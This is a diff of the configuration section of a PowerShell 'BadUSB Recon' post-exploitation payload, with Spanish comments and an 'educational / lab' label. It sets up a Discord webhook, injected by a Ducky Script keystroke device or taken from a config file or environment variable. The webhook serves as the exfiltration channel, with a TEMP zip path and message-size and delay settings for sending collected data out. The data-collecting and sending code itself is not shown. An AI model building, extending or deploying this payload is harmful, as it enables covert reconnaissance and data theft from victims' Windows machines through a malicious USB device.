@@ -1,46 +1,79 @@
 # ============================================================
-# BadUSB Recon — Payload de reconocimiento post-explotación
+# BadUSB Recon - Payload de reconocimiento post-explotacion
 # ------------------------------------------------------------
 # Entorno : Windows 10/11, PowerShell 5.1+
 # Uso     : Educativo / laboratorio propio
 # Autor   : 14ND3R
-# Repo    : https://github.com/AndYLndR/badusb-recon
+# Repo    : https://github.com/AndYLndR/badusb-recon-lab
 # ============================================================
+
+param(
+    [string]$Webhook
+)
 
 $ErrorActionPreference = "SilentlyContinue"
 
 # ------------------------------------------------------------
-# CONFIGURACIÓN
-# El webhook se inyecta de tres formas posibles, por orden:
-#   1. $Config.Webhook cargado desde config.local.ps1 (dev)
-#   2. Variable de entorno $env:DISCORD_WEBHOOK (dev rápido)
-#   3. Valor literal sustituido por encode_base64.ps1 (ataque)
+# CONFIGURACION
+# Precedencia del webhook (de mayor a menor prioridad):
+#   1. Parametro -Webhook (inyectado por el Ducky Script)
+#   2. $Config.Webhook desde config.local.ps1 (modo desarrollo)
+#   3. Variable de entorno $env:DISCORD_WEBHOOK (dev rapido)
+#   4. PLACEHOLDER_WEBHOOK (si nada de lo anterior)
 # ------------------------------------------------------------
 
-# 1. Cargar config local si existe
-$configPath = Join-Path $PSScriptRoot "..\config.local.ps1"
-if (Test-Path $configPath) { . $configPath }
+$Config = @{
+    Webhook = $null
+    SendZip = $false
+    ZipPath = "$env:TEMP\prueba.zip"
+    MaxLen  = 1900
+    DelayMs = 700
+}
 
-# 2. Fallback a variable de entorno
-if (-not $Config -or -not $Config.Webhook -or $Config.Webhook -like "*XXX*") {
-    if ($env:DISCORD_WEBHOOK) {
-        $Config = @{
-            Webhook = $env:DISCORD_WEBHOOK
-            SendZip = $false
-            MaxLen  = 1900
-            DelayMs = 700
+# 1. Parametro -Webhook (prioridad maxima)
+if ($Webhook) {
+    $Config.Webhook = $Webhook
+}
+
+# 2. config.local.ps1 (solo si no vino por parametro)
+if (-not $Config.Webhook) {
+    $configPath = if ($PSScriptRoot) {
+        Join-Path $PSScriptRoot "..\config.local.ps1"
+    } else {
+        Join-Path (Get-Location) "config.local.ps1"
+    }
+    if (Test-Path $configPath) {
+        . $configPath
+        if ($Config.Webhook -and $Config.Webhook -notlike "*XXX*" -and $Config.Webhook -notlike "*PLACEHOLDER*") {
+            # Ya esta cargado
         }
     }
 }
 
-# 3. Fallback al placeholder (lo sustituye encode_base64.ps1 antes de codificar)
-if (-not $Config -or -not $Config.Webhook -or $Config.Webhook -like "*XXX*") {
-    $Config = @{
-        Webhook = "PLACEHOLDER_WEBHOOK"
-        SendZip = $false
-        MaxLen  = 1900
-        DelayMs = 700
+# 3. Variable de entorno
+if (-not $Config.Webhook -or $Config.Webhook -like "*PLACEHOLDER*") {
+    if ($env:DISCORD_WEBHOOK) {
+        $Config.Webhook = $env:DISCORD_WEBHOOK
     }
+}
+
+# 4. Placeholder final
+if (-not $Config.Webhook) {
+    $Config.Webhook = "PLACEHOLDER_WEBHOOK"
+}
+
+$Webhook = $Config.Webhook
+$MaxLen  = $Config.MaxLen
+$DelayMs = $Config.DelayMs
+
+# Comprobacion final
+if ($Webhook -like "*PLACEHOLDER*" -or $Webhook -like "*XXX*" -or $Webhook -notmatch "^https?://") {
+    Write-Host "[-] No se ha configurado un webhook valido. Abortando." -ForegroundColor Red
+    Write-Host "    Opciones:" -ForegroundColor Yellow
+    Write-Host "      1. Ejecutar con -Webhook <url>"
+    Write-Host "      2. Crear config.local.ps1 con `$Config.Webhook"
+    Write-Host "      3. Exportar `$env:DISCORD_WEBHOOK"
+    exit 1
 }
 
 $Webhook = $Config.Webhook
